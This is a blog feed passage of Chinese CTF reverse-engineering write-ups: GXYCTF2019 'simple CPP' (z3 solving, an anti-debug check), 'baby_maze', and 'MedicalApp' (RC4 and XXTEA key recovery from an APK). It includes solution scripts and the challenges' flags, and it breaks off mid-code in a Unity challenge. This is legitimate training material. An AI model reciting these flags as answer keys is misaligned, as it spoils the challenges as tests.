class="number">2</span>];</span><br><span class="line">  v21 = v20[<span class="number">1</span>];</span><br><span class="line">  v22 = *v20;</span><br><span class="line">  v23 = (__int64 *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>ui64);</span><br><span class="line">  <span class="keyword">if</span> ( IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1400019C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Hi , DO not debug me !&quot;</span>, v24);</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v25 = v21 &amp; v22;</span><br><span class="line">  *v23 = v21 &amp; v22;</span><br><span class="line">  v26 = v42 &amp; ~v22;</span><br><span class="line">  v23[<span class="number">1</span>] = v26;</span><br><span class="line">  v27 = ~v21;</span><br><span class="line">  v28 = v42 &amp; v27;</span><br><span class="line">  v23[<span class="number">2</span>] = v42 &amp; v27;</span><br><span class="line">  v29 = v22 &amp; v27;</span><br><span class="line">  v23[<span class="number">3</span>] = v29;</span><br><span class="line">  <span class="keyword">if</span> ( v26 != <span class="number">0x11204161012</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    v23[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v26 = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  v30 = v26 | v25 | v28 | v29;</span><br><span class="line">  v31 = v20[<span class="number">1</span>];</span><br><span class="line">  v32 = v20[<span class="number">2</span>];</span><br><span class="line">  v33 = v28 &amp; *v20 | v32 &amp; (v25 | v31 &amp; ~*v20 | ~(v31 | *v20));</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v33 == <span class="number">0x8020717153E3013</span>i64 )</span><br><span class="line">    v34 = v30 == <span class="number">0x3E3A4717373E7F1F</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( (v30 ^ v20[<span class="number">3</span>]) == <span class="number">0x3E3A4717050F791F</span>i64 )</span><br><span class="line">    v3 = v34;</span><br><span class="line">  <span class="keyword">if</span> ( (v26 | v25 | v31 &amp; v32) == (~*v20 &amp; v32 | <span class="number">0xC00020130082C0C</span>i64) &amp;&amp; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = sub_1400019C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Congratulations!flag is GXY&#123;&quot;</span>, v33);</span><br><span class="line">    v36 = Block;</span><br><span class="line">    <span class="keyword">if</span> ( v45 &gt;= <span class="number">0x10</span> )</span><br><span class="line">      v36 = (<span class="keyword">void</span> **)Block[<span class="number">0</span>];</span><br><span class="line">    v37 = sub_140001FD0(v35, v36, v44);</span><br><span class="line">    sub_1400019C0(v37, <span class="string">&quot;&#125;&quot;</span>, v38);</span><br><span class="line">    j_j_free(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_1400019C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Wrong answer!try again&quot;</span>, v33);</span><br><span class="line">    j_j_free(v8);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_43:</span><br><span class="line">  <span class="keyword">if</span> ( v45 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v40 = Block[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v45 + <span class="number">1</span> &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v40 = (<span class="keyword">void</span> *)*((_QWORD *)Block[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(Block[<span class="number">0</span>] - v40 - <span class="number">8</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        invalid_parameter_noinfo_noreturn();</span><br><span class="line">    &#125;</span><br><span class="line">    j_j_free(v40);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来的一个if就是堆叠，后面的就是数据运算。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">v42 = v20[2];</span><br><span class="line">v21 = v20[1];</span><br><span class="line">v22 = v20[0];</span><br><span class="line"></span><br><span class="line">v25 = v21 &amp; v22</span><br><span class="line">v23[0] = v21 &amp; v22</span><br><span class="line">得到v25=v23[0]= v21 &amp; v22=v20[1]&amp;v20[0]</span><br><span class="line"></span><br><span class="line">v26 = v42 &amp; ~v22</span><br><span class="line">v23[1] = v26;</span><br><span class="line">得到 v26 =v23[1]= v42 &amp; ~v22=v20[2]&amp;~v20[0]</span><br><span class="line"></span><br><span class="line">v27 = ~v21;</span><br><span class="line">得到 v27 = ~v21=~v20[1]</span><br><span class="line"></span><br><span class="line">v28 = v42 &amp; v27;</span><br><span class="line">v23[2] = v42 &amp; v27;</span><br><span class="line">得到 v23[2] = v42 &amp; v27=v28=v20[2]&amp; ~v20[1]</span><br><span class="line"></span><br><span class="line">v29 = v22 &amp; v27;</span><br><span class="line">v23[3] = v29;</span><br><span class="line">得到v29 = v22 &amp; v27=v23[3]=v20[0]&amp;~v20[1]</span><br><span class="line"></span><br><span class="line">v26=v23[1]=1176889593874</span><br><span class="line">得到 v20[2]&amp;~v20[0]=1176889593874</span><br><span class="line"></span><br><span class="line">v30 = v26 | v25 | v28 | v29</span><br><span class="line">得到 v27 =(v20[1]&amp;v20[0]) | (v20[1]&amp;v20[0]) |(v20[2]&amp; ~v20[1]) | (v20[0]&amp;~v20[1])=4483974544037412639</span><br><span class="line"></span><br><span class="line">v31 = v20[1];</span><br><span class="line">v32 = v20[2];</span><br><span class="line">v33 = v25 &amp; *v20 | v29 &amp; (v22 | v28 &amp; ~*v20 | ~(v28 | *v20))=577031497978884115i64</span><br><span class="line">得到v33 =（v20[2]&amp; ~v20[1]） &amp; v20[0] | v20[2] &amp; (（v20[1]&amp;v20[0]） | v20[1] &amp; ~v20[0] | ~(v20[1] | v20[0]))=577031497978884115</span><br><span class="line"></span><br><span class="line">v34 = v30 == 4483974544037412639i64;</span><br><span class="line">v30 ^ v20[3] == 4483974543195470111i64 )</span><br><span class="line">得到 v20[3]^(v20[1]&amp;v20[0]) | (v20[1]&amp;v20[0]) |(v20[2]&amp; ~v20[1]) | (v20[0]&amp;~v20[1])=4483974544037412639</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>x,y,z,w分别代表v20[0]~v20[3],用z3库求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x,y,z,w=BitVecs(<span class="string">&#x27;x y z w&#x27;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">s=Solver()</span><br><span class="line"></span><br><span class="line">s.add((~x)&amp;z==<span class="number">1176889593874</span>)</span><br><span class="line">s.add(((z&amp;~x)|(x&amp;y)|(z&amp;(~y))|(x&amp;(~y)))^w==<span class="number">4483974543195470111</span>)</span><br><span class="line">s.add(((z&amp;~y)&amp;x|z&amp;((x&amp;y)|y&amp;~x|~(y|x)))==<span class="number">577031497978884115</span>)</span><br><span class="line">s.add(((z&amp;~x)|(x&amp;y)|(z&amp;~y)|(x&amp;~y))==<span class="number">4483974544037412639</span>)</span><br><span class="line">s.add(((z&amp;(~x)) | (x&amp;y) | y &amp; z) == (((~x)&amp; z)|<span class="number">864693332579200012</span>))</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    print(<span class="string">&quot;%s = 0x%x&quot;</span>%(i,m[i].as_long()))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后异或一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Dst = <span class="string">&#x27;i_will_check_is_debug_or_noi_wil&#x27;</span></span><br><span class="line">flag=[<span class="number">0x3E</span>,<span class="number">0x3A</span>,<span class="number">0x46</span>,<span class="number">0x05</span>,<span class="number">0x33</span>,<span class="number">0x28</span>,<span class="number">0x6F</span>,<span class="number">0x0D</span>,<span class="number">0x8C</span>,<span class="number">0x00</span>,<span class="number">0x8A</span>,<span class="number">0x09</span>,<span class="number">0x78</span>,<span class="number">0x49</span>,<span class="number">0x2C</span>,<span class="number">0xAC</span>,<span class="number">0x08</span>,<span class="number">0x02</span>,<span class="number">0x07</span>,<span class="number">0x17</span>,<span class="number">0x15</span>,<span class="number">0x3E</span>,<span class="number">0x30</span>,<span class="number">0x13</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x06</span>]</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    s+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(Dst[i]) ^ flag[i])</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>We1l_D0näeéb’ _ólgebra_am_i，有点奇怪，因为方程不止一个解</p><p>从We1l_D0n后开始把äeéb’ _ó改成e!P0or_a即是最后的flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GXYCTF2019-simple-CPP&quot;&gt;&lt;a href=&quot;#GXYCTF2019-simple-CPP&quot; class=&quot;headerlink&quot; title=&quot;[GXYCTF2019]simple CPP&quot;&gt;&lt;/a&gt;[GXYCTF2019]simple CPP</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2021巅峰极客reverse</title>
    <link href="http://example.com/2021/08/02/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse/"/>
    <id>http://example.com/2021/08/02/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse/</id>
    <published>2021-08-02T09:42:29.000Z</published>
    <updated>2021-08-03T06:30:14.568Z</updated>
    
    <content type="html"><![CDATA[<h1 id="baby-maze"><a href="#baby-maze" class="headerlink" title="baby_maze"></a>baby_maze</h1><p>看题目本来以为是一道简单的迷宫题，进去之后才发现这么多函数</p><p>先找一下string，发现了一个God job这应该就是最后的结果</p><p><img src="/2021/08/02/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse/3.PNG" alt="3"></p><p>那可以想到通过这个函数去查看调用它的函数，一步步逆推回去，都是发现是行不通的，函数太多了有7000多个，没有办法找回去，做的时候前后都走不通</p><p><img src="/2021/08/02/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse/5.PNG" alt="5"></p><p>后来才知道可以用后向调用为<code>gen_r_call_chain</code>函数，它递归地调用了<code>get_my_caller</code>函数来实现后向调用的追踪.接下来就可以在下面的交互终端run我们的函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gen_r_call_chain(<span class="string">&#x27;sub_54DE35&#x27;</span>, <span class="number">600</span>, <span class="string">&#x27;sub_40187C&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/08/02/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse/1.PNG" alt="1"></p><p>可以的到几个路径，看第一个符合，再加上第一个函数的S就是最后的结果</p><p>MD5一下就可以得到最后的flag</p><p><img src="/2021/08/02/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse/6.PNG" alt="6"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;078c8fbc1d0d033f663dcc58e899c101&#125;</span><br></pre></td></tr></table></figure><h2 id="MedicalApp"><a href="#MedicalApp" class="headerlink" title="MedicalApp"></a>MedicalApp</h2><p>题目给了一个安卓APK，APK的主要逻辑都在native里面。</p><p>再chk函数里面就是加密过程，用到了RC4+xxtea</p><p><img src="/2021/08/02/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse/7.PNG" alt="7"></p><p>找到密钥</p><p><img src="/2021/08/02/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse/8.PNG" alt="8"></p><p>xxtea的解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9f5776b6  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;  </span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;  </span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;  </span><br><span class="line">        sum = <span class="number">0</span>;  </span><br><span class="line">        z = v[n<span class="number">-1</span>];  </span><br><span class="line">        <span class="keyword">do</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">            sum += DELTA;  </span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;  </span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)  </span><br><span class="line">            &#123;  </span><br><span class="line">                y = v[p+<span class="number">1</span>];  </span><br><span class="line">                z = v[p] += MX;  </span><br><span class="line">            &#125;  </span><br><span class="line">            y = v[<span class="number">0</span>];  </span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">while</span> (--rounds);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        n = -n;  </span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;  </span><br><span class="line">        sum = rounds*DELTA;  </span><br><span class="line">        y = v[<span class="number">0</span>];  </span><br><span class="line">        <span class="keyword">do</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;  </span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)  </span><br><span class="line">            &#123;  </span><br><span class="line">                z = v[p<span class="number">-1</span>];  </span><br><span class="line">                y = v[p] -= MX;  </span><br><span class="line">            &#125;  </span><br><span class="line">            z = v[n<span class="number">-1</span>];  </span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;  </span><br><span class="line">            sum -= DELTA;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">while</span> (--rounds);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> d[] =</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x97</span>, <span class="number">0xE5</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0x73</span>, <span class="number">0x0C</span>, <span class="number">0xC2</span>, <span class="number">0x1B</span>, <span class="number">0xD4</span>, </span><br><span class="line">    <span class="number">0xAF</span>, <span class="number">0x98</span>, <span class="number">0xE2</span>, <span class="number">0x9D</span>, <span class="number">0x4B</span>, <span class="number">0xFE</span>, <span class="number">0x0B</span>, <span class="number">0xB6</span>, <span class="number">0xA5</span>, <span class="number">0x01</span>, </span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0xD6</span>, <span class="number">0x36</span>, <span class="number">0x3D</span>, <span class="number">0xAF</span>, <span class="number">0x7B</span>, <span class="number">0xCC</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, </span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0xA0</span>, <span class="number">0x1A</span>, <span class="number">0xE7</span>, <span class="number">0x2C</span>, <span class="number">0x76</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> cipher[<span class="number">9</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;AOLIGEI111&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(key, d, <span class="keyword">sizeof</span>(d));</span><br><span class="line">    <span class="built_in">memcpy</span>(cipher, ida_chars, <span class="keyword">sizeof</span>(ida_chars));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;AOLIGEI222&quot;</span>); </span><br><span class="line">    <span class="keyword">int</span> n= <span class="number">9</span>;</span><br><span class="line">    btea(cipher, -n, key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">36</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)cipher + i));</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RC4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_crypt</span>(<span class="params">PlainBytes:<span class="built_in">bytes</span>, KeyBytes:<span class="built_in">bytes</span></span>) -&gt; str:</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;[summary]</span></span><br><span class="line"><span class="string">    rc4 crypt</span></span><br><span class="line"><span class="string">    Arguments:</span></span><br><span class="line"><span class="string">        PlainBytes &#123;[bytes]&#125; -- [plain bytes]</span></span><br><span class="line"><span class="string">        KeyBytes &#123;[bytes]&#125; -- [key bytes]</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        [string] -- [hex string]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">    keystreamList = []</span><br><span class="line">    cipherList = []</span><br><span class="line"> </span><br><span class="line">    keyLen = <span class="built_in">len</span>(KeyBytes)</span><br><span class="line">    plainLen = <span class="built_in">len</span>(PlainBytes)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line"> </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + KeyBytes[i % keyLen]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"> </span><br><span class="line">    print(<span class="built_in">bytes</span>(S).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(plainLen):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        print(i, j)</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        print(S[i], S[j])</span><br><span class="line">        cipherList.append(k ^ PlainBytes[m])</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(cipherList)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = <span class="string">&#x27;5604b0d49c634d3096cec00593be3b82524b16b28a33b74d6d7b9950c2b10c12e1840a93&#x27;</span></span><br><span class="line">    key = <span class="string">&#x27;01000000100000000001000000100000&#x27;</span></span><br><span class="line">    data = <span class="built_in">bytes</span>.fromhex(data)</span><br><span class="line">    key = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">    m = rc4_crypt(data, key)</span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure><p>RC4解密结果为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;194836950ae9df840e8a94348b901a&#125;</span><br></pre></td></tr></table></figure><h3 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h3><p>XXTEA，又称Corrected Block TEA，是XTEA的升级版</p><p>，设计者是Roger Needham, David Wheeler</p><p>加密过程：</p><p><img src="https://upload-images.jianshu.io/upload_images/1272254-9fcbbcba52c083a9?imageMogr2/auto-orient/strip%7CimageView2/2/w/391/format/webp" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;baby-maze&quot;&gt;&lt;a href=&quot;#baby-maze&quot; class=&quot;headerlink&quot; title=&quot;baby_maze&quot;&gt;&lt;/a&gt;baby_maze&lt;/h1&gt;&lt;p&gt;看题目本来以为是一道简单的迷宫题，进去之后才发现这么多函数&lt;/p&gt;
&lt;p&gt;先找一下s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUU-reverse3</title>
    <link href="http://example.com/2021/08/01/BUU-reverse3/"/>
    <id>http://example.com/2021/08/01/BUU-reverse3/</id>
    <published>2021-08-01T02:26:16.000Z</published>
    <updated>2021-08-01T02:49:37.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-BJD-hamburger-competition"><a href="#BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="[BJDCTF2020]BJD hamburger competition]"></a>[BJDCTF2020]BJD hamburger competition]</h1><p><strong>识别Unity游戏</strong></p><p>Android平台的apk包可以直接解压，看是否有./assets/bin/Data/Managed目录，也可以查看lib文件夹下面包含的一些so，如果有libmono,libunity等模块，基本可以确定是unity游戏了。</p><p>Android平台中C#编写的主逻辑模块代码静态编辑之后存储于Assembly-CSharp.dll文件中。因为unity的跨平台，Android平台是unity编译的游戏，那么其对应的IOS平台上也是unity编译出来的。如果希望直接从IOS上面去看是否是unity游戏，可以提取游戏中的主模块查看是否有unity之类的函数即可。</p><p>这道题找对文件分析就行，dnSpy打开Assembly-CSharp.dll文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 